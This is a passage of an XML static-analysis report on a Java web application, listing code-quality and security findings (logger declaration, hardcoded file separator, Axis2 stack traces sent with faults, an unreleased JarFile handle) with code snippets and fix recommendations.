                        <Issue iid="315BBE203A5F356725ABE2977D2C5A57" ruleID="BADC0909-9860-4304-88B8-D539884A5CD0">
                            <Category>Poor Logging Practice: Logger Not Declared Static Final</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The class CNSIApacheLogImpl should declare its logger to be static and final.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIApacheLogImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/log/CNSIApacheLogImpl.java</FilePath>
<LineStart>32</LineStart>
<Snippet>	*	Variable to hold the Log4j Logger for given Module.
	*/
	private org.apache.log4j.Logger m_objCurrentLogger = null;

	/**</Snippet>
<TargetFunction>Field: m_objCurrentLogger()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Portability Flaw: File Separator</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The call to File() on line 551 causes portability problems because it uses a hardcoded file separator.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Different operating systems use different characters as file separators. For example, Microsoft Windows systems use "\", while UNIX systems use "/". When applications have to run on different platforms, the use of hardcoded file separators can lead to incorrect execution of application logic and potentially a denial of service.



Example 1: The following code uses a hardcoded file separator to open a file:


...
File file = new File(directoryName + "\\" + fileName);
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>In order to write portable code, avoid using hardcoded file separators. Instead, rely on platform-independent APIs provided by the language library.

Example 2: The following code implements the same functionality as Example 1, but uses platform-independent API to specify a file separator:


...
File file = new File(directoryName + File.separator + fileName);
...
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="AC326730ED738F270DF81B904A6F0E96" ruleID="2C293937-873C-4DFD-9F58-1B2596CE872B">
                            <Category>Portability Flaw: File Separator</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The call to File() on line 551 causes portability problems because it uses a hardcoded file separator.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>551</LineStart>
<Snippet>        try
        {
            File aFile = new File(p_strFileName);
            bf = new BufferedWriter(new FileWriter(aFile), ONE_MEGABYTE);
        bf.write(p_strContents.toString());</Snippet>
<TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1080</LineStart>
<Snippet>      xmlFileName.add("C:\\ecams\\xml\\defaultAction.xml");
      
      ActionMapper l_objActionMapper = new ActionMapper( "C:\\ecams\\xml\\ACTIONJING.xml", xmlFileName);
      /*
      System.out.println("RequestHandler for HomePage " + l_objActionMapper.getPageRequestHandlerClass("security","HomePage"));</Snippet>
<TargetFunction>Read()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>System Information Leak: Apache Axis 2</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>An information leak occurs when system data or debug information leaves the program through an output stream or logging function.



This parameter tells Apache Axis 2 to send fault messages to clients. Fault messages contain stack traces and in some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems.

Even brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an "Access Denied" message can reveal that a file or user exists on the system.

In this case, set the sendStacktraceDetailsWithFaults parameter to false as follows:

&lt;parameter name="sendStacktraceDetailsWithFaults"&gt;false&lt;/parameter&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E752D445991F359E7840195A9151E759" ruleID="1410B3D0-EF10-495A-B346-816AFCE2F0AF">
                            <Category>System Information Leak: Apache Axis 2</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>axis2.xml</FileName>
<FilePath>XML/axis2.xml</FilePath>
<LineStart>20</LineStart>
<Snippet>    &lt;!--During a fault, stacktrace can be sent with the fault message. The following flag will control --&gt;
    &lt;!--that behaviour.--&gt;
    &lt;parameter name="sendStacktraceDetailsWithFaults" locked="false"&gt;true&lt;/parameter&gt;

    &lt;!--If there aren't any information available to find out the fault reason, we set the message of the expcetion--&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Unreleased Resource: Files</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The function extractPropertiesInfo() in ControlServlet.java sometimes fails to release a file handle allocated by JarFile() on line 459.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>The program can potentially fail to release a file handle.

Resource leaks have at least two common causes:

- Error conditions and other exceptional circumstances.

- Confusion over which part of the program is responsible for releasing the resource.

Most unreleased resource issues result in general software reliability problems. However, if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.

Example 1: The following method never closes the file handle it opens. The finalize() method for ZipFile eventually calls close(), but there is no guarantee as to how long it will take before the finalize() method will be invoked. In a busy environment, this can result in the JVM using up all of its file handles.


public void printZipContents(String fName)
    throws ZipException, IOException, SecurityException, IllegalStateException, NoSuchElementException
{
  ZipFile zf = new ZipFile(fName);
  Enumeration&lt;ZipEntry&gt; e = zf.entries();

  while (e.hasMoreElements()) {
    printFileInfo(e.nextElement());
  }
}


Example 2: Under normal conditions, the following fix properly closes the file handle after printing out all the zip file entries. But if an exception occurs while iterating through the entries, the zip file handle will not be closed. If this happens often enough, the JVM can still run out of available file handles.


public void printZipContents(String fName)
    throws ZipException, IOException, SecurityException, IllegalStateException, NoSuchElementException
{
  ZipFile zf = new ZipFile(fName);
  Enumeration&lt;ZipEntry&gt; e = zf.entries();

  while (e.hasMoreElements()) {
    printFileInfo(e.nextElement());
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>1. Never rely on finalize() to reclaim resources. In order for an object's finalize() method to be invoked, the garbage collector must determine that the object is eligible for garbage collection. Because the garbage collector is not required to run unless the JVM is low on memory, there is no guarantee that an object's finalize() method will be invoked in an expedient fashion. When the garbage collector finally does run, it may cause a large number of resources to be reclaimed in a short period of time, which can lead to "bursty" performance and lower overall system throughput. This effect becomes more pronounced as the load on the system increases.

Finally, if it is possible for a resource reclamation operation to hang (if it requires communicating over a network, for example), then the thread that is executing the finalize() method will hang.

2. Release resources in a finally block. The code for Example 2 should be rewritten as follows:


public void printZipContents(String fName)
    throws ZipException, IOException, SecurityException, IllegalStateException, NoSuchElementException
{
  ZipFile zf;
  try {
    zf = new ZipFile(fName);
    Enumeration&lt;ZipEntry&gt; e = zf.entries();
    ...
  }
  finally {
    if (zf != null) {
      safeClose(zf);
    }
  }
}

public static void safeClose(ZipFile zf) {
  if (zf != null) {
    try {
      zf.close();
    } catch (IOException e) {
      log(e);
    }
  }
}


This solution uses a helper function to log the exceptions that might occur when trying to close the file. Presumably this helper function will be reused whenever a file needs to be closed.

Also, the printZipContents method does not initialize the zf object to null. Instead, it checks to ensure that zf is not null before calling safeClose(). Without the null check, the Java compiler reports that zf might not be initialized. This choice takes advantage of Java's ability to detect uninitialized variables. If  zf is initialized to null in a more complex method, cases in which zf is used without being initialized will not be detected by the compiler.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5E181BB6E51F586AAD5E573ED83EED1B" ruleID="15A7E886-8858-4BA6-B35E-91FAA8C562F4">
                            <Category>Unreleased Resource: Files</Category>
                            <Folder>High</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>The function extractPropertiesInfo() in ControlServlet.java sometimes fails to release a file handle allocated by JarFile() on line 459.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ControlServlet.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/base/ControlServlet.java</FilePath>
<LineStart>459</LineStart>
<Snippet>    		// Create &amp; then Read the Jar file  and loop thru the entries
    		l_objFileJar = new File(p_sPropsDir+"/"+PROPERTIES_JAR_FILE_NAME);
    		l_objJarObj = new JarFile(l_objFileJar);
            java.util.Enumeration l_enumJarEntries = l_objJarObj.entries();
           	</Snippet>
<TargetFunction>l_objJarObj = new JarFile(...)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                </Chart>
            </IssueListing>
        </SubSection>
    </ReportSection>
</ReportDefinition>
